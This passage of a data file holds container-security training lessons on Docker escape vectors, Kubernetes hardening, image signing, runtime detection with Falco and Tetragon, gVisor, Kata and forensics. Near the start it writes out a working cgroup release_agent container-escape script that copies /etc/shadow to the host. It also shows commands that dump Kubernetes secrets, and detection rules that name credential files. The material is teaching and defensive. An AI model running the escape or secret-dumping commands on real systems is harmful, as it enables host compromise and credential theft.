ls /.dockerenv 2>/dev/null && echo "In Docker"

# Privileged container escape via cgroups
mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape
echo 1 > /tmp/escape/notify_on_release
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/escape/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd
\`\`\`

Common escape vectors:
- Mounted Docker socket
- \`--privileged\` flag
- Excessive capabilities (CAP_SYS_ADMIN)
- Kernel exploits (shared kernel with host)
- Writable host paths mounted as volumes`,
        sortOrder: 0,
      },
      {
        heading: "Kubernetes security fundamentals",
        content: `Kubernetes adds orchestration complexity and its own attack surface:

\`\`\`yaml
# Pod Security Standards (PSS) - restricted level
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      image: myapp:v1
      securityContext:
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
        readOnlyRootFilesystem: true
\`\`\`

\`\`\`bash
# Check RBAC permissions
kubectl auth can-i --list
kubectl auth can-i create pods

# Look for secrets
kubectl get secrets -A
kubectl get secret db-creds -o jsonpath='{.data.password}' | base64 -d
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "Container networking and service mesh",
        content: `Docker creates bridge networks by default. Understanding the networking model is important for lateral movement detection:

\`\`\`bash
# List networks
docker network ls

# Inspect network — shows connected containers and IPs
docker network inspect bridge

# Create isolated network
docker network create --internal isolated

# Containers on the same network can communicate freely
docker run -d --network mynet --name db postgres
docker run -d --network mynet --name web myapp
# web can reach db:5432 directly
\`\`\`

In Kubernetes, NetworkPolicies restrict pod-to-pod communication:

\`\`\`yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
    - Ingress
    - Egress
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "Image supply chain security",
        content: `Verify that images haven't been tampered with:

\`\`\`bash
# Docker Content Trust (DCT) — signature verification
export DOCKER_CONTENT_TRUST=1
docker pull nginx:latest  # will fail if not signed

# Cosign — keyless signing with OIDC
cosign sign --yes myregistry.io/myapp:v1
cosign verify myregistry.io/myapp:v1

# SBOM generation
syft myapp:v1 -o spdx-json > sbom.json
\`\`\`

Pin images by digest, not tag, in production:

\`\`\`dockerfile
FROM nginx@sha256:abc123...
\`\`\`

Tags can be overwritten (tag-mutability); digests are content-addressable and immutable.`,
        sortOrder: 3,
      },
      {
        heading: "Infrastructure as Code security",
        content: `Terraform and Ansible configurations should be scanned for misconfigurations:

\`\`\`bash
# Scan Terraform with tfsec
tfsec .

# Scan Kubernetes manifests with kubesec
kubesec scan deployment.yaml

# Scan Dockerfiles with hadolint
hadolint Dockerfile
\`\`\`

Common IaC misconfigurations:
- S3 buckets with public access
- Security groups allowing 0.0.0.0/0 on sensitive ports
- Unencrypted storage volumes
- Default credentials in configuration`,
        sortOrder: 4,
      },
      {
        heading: "Sources",
        content: `- NIST SP 800-190 (Application Container Security Guide)
- Kubernetes Pod Security Standards: kubernetes.io/docs/concepts/security/pod-security-standards
- CIS Kubernetes Benchmark
- Sigstore/Cosign documentation: sigstore.dev
- OWASP Kubernetes Security Cheat Sheet`,
        sortOrder: 5,
      },
    ],
  },

  // ── containers-infra L4 ─────────────────────────────────────────────────
  {
    competencyId: "containers-infra",
    depthTier: 4,
    title: "Production Container Security",
    recommendedLevel: 4,
    sections: [
      {
        heading: "Rootless containers and gVisor",
        content: `Rootless containers run the entire container engine without root privileges, significantly reducing the blast radius of escapes:

\`\`\`bash
# Rootless Docker
dockerd-rootless-setuptool.sh install
export DOCKER_HOST=unix:///run/user/$(id -u)/docker.sock

# Podman (rootless by default)
podman run -d -p 8080:80 nginx
\`\`\`

gVisor (runsc) adds a user-space kernel between the container and the host kernel:

\`\`\`bash
# Install gVisor runtime
# Configure Docker to use it
# /etc/docker/daemon.json
{
  "runtimes": {
    "runsc": {
      "path": "/usr/local/bin/runsc"
    }
  }
}

docker run --runtime=runsc nginx
\`\`\`

gVisor intercepts syscalls in userspace, providing defense-in-depth — even if a container escape exploit exists, it hits gVisor's syscall emulation rather than the real kernel.`,
        sortOrder: 0,
      },
      {
        heading: "Runtime threat detection",
        content: `Falco uses eBPF to detect anomalous container behavior in real time:

\`\`\`yaml
# Falco rule: detect shell spawned in container
- rule: Terminal shell in container
  desc: A shell was used as entrypoint/exec
  condition: >
    spawned_process and container and shell_procs
    and proc.tty != 0
  output: >
    Shell spawned in container
    (user=%user.name container=%container.name
    shell=%proc.name parent=%proc.pname)
  priority: WARNING
\`\`\`

\`\`\`bash
# Run Falco
falco -r /etc/falco/falco_rules.yaml

# Custom rule: detect sensitive mount
- rule: Sensitive mount detected
  condition: >
    container and evt.type in (mount) and
    fd.name startswith /etc
  output: Mount of sensitive path in container
  priority: CRITICAL
\`\`\``,
        sortOrder: 1,
      },
      {
        heading: "Container forensics",
        content: `When investigating a compromised container:

\`\`\`bash
# Export container filesystem for analysis
docker export compromised_container > container_fs.tar

# Diff against the original image
docker diff compromised_container
# C /tmp
# A /tmp/backdoor.sh
# C /etc/crontab

# Save image layers for inspection
docker save myapp:v1 | tar -xf - -C ./layers/
# Each layer is a separate tar — examine the manifest.json

# Check running processes at time of incident
docker top compromised_container

# Copy files out for analysis
docker cp compromised_container:/tmp/backdoor.sh ./evidence/
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "CI/CD pipeline security",
        content: `Container builds in CI/CD need their own security controls:

\`\`\`yaml
# GitHub Actions example with security scanning
jobs:
  build:
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t myapp:$GITHUB_SHA .

      - name: Scan for vulnerabilities
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:$GITHUB_SHA
          exit-code: 1
          severity: CRITICAL,HIGH

      - name: Sign image
        run: cosign sign --yes myregistry.io/myapp:$GITHUB_SHA

      - name: Push (only if scan passes)
        run: docker push myregistry.io/myapp:$GITHUB_SHA
\`\`\`

Never give CI runners Docker socket access without understanding the implications — a compromised build step can escape to the host.`,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- gVisor documentation: gvisor.dev
- Falco documentation: falco.org
- Podman documentation: podman.io
- NIST SP 800-190 (Application Container Security Guide)
- SLSA framework: slsa.dev (Supply-chain Levels for Software Artifacts)`,
        sortOrder: 4,
      },
    ],
  },

  // ── containers-infra L5 ─────────────────────────────────────────────────
  {
    competencyId: "containers-infra",
    depthTier: 5,
    title: "Container Internals and Advanced Isolation",
    recommendedLevel: 5,
    sections: [
      {
        heading: "OCI runtime specification internals",
        content: `The OCI runtime spec defines how a container is created from a filesystem bundle. The config.json file specifies namespaces, mounts, capabilities, seccomp, and rlimits:

\`\`\`json
{
  "ociVersion": "1.0.2",
  "process": {
    "terminal": false,
    "user": { "uid": 65534, "gid": 65534 },
    "args": ["/app/server"],
    "capabilities": {
      "bounding": ["CAP_NET_BIND_SERVICE"],
      "effective": ["CAP_NET_BIND_SERVICE"]
    }
  },
  "linux": {
    "namespaces": [
      { "type": "pid" },
      { "type": "network" },
      { "type": "mount" },
      { "type": "uts" },
      { "type": "ipc" }
    ],
    "seccomp": {
      "defaultAction": "SCMP_ACT_ERRNO",
      "syscalls": [...]
    }
  }
}
\`\`\`

Understanding the runtime spec helps identify exactly what isolation boundaries exist and where they can fail. \`runc\` (the reference implementation) has had critical CVEs (e.g., CVE-2024-21626 — working directory container escape).`,
        sortOrder: 0,
      },
      {
        heading: "Kata Containers and microVMs",
        content: `Kata Containers run each container in a lightweight virtual machine, combining VM-level isolation with container-like speed:

\`\`\`
Traditional container: Process → Namespaces/cgroups → Host kernel
Kata container:        Process → Guest kernel → VMM (QEMU/Firecracker) → Host kernel
\`\`\`

Firecracker (from AWS, powers Lambda and Fargate) creates microVMs in ~125ms with ~5MB memory overhead:

\`\`\`bash
# Kata with containerd
# /etc/containerd/config.toml
[plugins."io.containerd.grpc.v1.cri".containerd.runtimes.kata]
  runtime_type = "io.containerd.kata.v2"

# Run a pod with Kata runtime
kubectl run secure-pod --image=nginx --runtime-class=kata
\`\`\`

The tradeoff: stronger isolation at the cost of higher memory overhead per container and slightly more complex networking (each VM has its own network stack).`,
        sortOrder: 1,
      },
      {
        heading: "Container image internals",
        content: `OCI images are content-addressable layers stored as tar archives:

\`\`\`bash
# Inspect image manifest
skopeo inspect --raw docker://nginx:latest | jq .

# Download and unpack layers
skopeo copy docker://nginx:latest oci:nginx-oci
# nginx-oci/blobs/sha256/ contains the layer tarballs

# Analyze layer contents
tar -tzf blobs/sha256/<layer-hash> | head -20

# Build a minimal image from scratch (no base image)
FROM scratch
COPY mystaticbinary /app
ENTRYPOINT ["/app"]
\`\`\`

Each Dockerfile instruction creates a new layer. Secrets that appear in any layer persist in the image — even if deleted in a later layer. Use \`--mount=type=secret\` in BuildKit to avoid this:

\`\`\`dockerfile
# syntax=docker/dockerfile:1
RUN --mount=type=secret,id=api_key cat /run/secrets/api_key
\`\`\``,
        sortOrder: 2,
      },
      {
        heading: "eBPF-based container security",
        content: `Tetragon (from Cilium/Isovalent) uses eBPF for kernel-level security enforcement with near-zero overhead:

\`\`\`yaml
# TracingPolicy: block writes to sensitive paths
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: block-sensitive-writes
spec:
  kprobes:
    - call: security_file_permission
      syscall: false
      args:
        - index: 0
          type: file
      selectors:
        - matchArgs:
            - index: 0
              operator: Prefix
              values:
                - /etc/shadow
                - /etc/passwd
          matchActions:
            - action: Sigkill
\`\`\`

Unlike Falco (which primarily detects), Tetragon can enforce — killing processes that violate policies in real time at the kernel level.`,
        sortOrder: 3,
      },
      {
        heading: "Sources",
        content: `- OCI Runtime Specification: github.com/opencontainers/runtime-spec
- Kata Containers architecture: katacontainers.io/docs
- Firecracker design: github.com/firecracker-microvm/firecracker/blob/main/docs/design.md
- Tetragon documentation: tetragon.io
- CVE-2024-21626 advisory (runc container escape)`,
        sortOrder: 4,
      },
    ],
  },
];
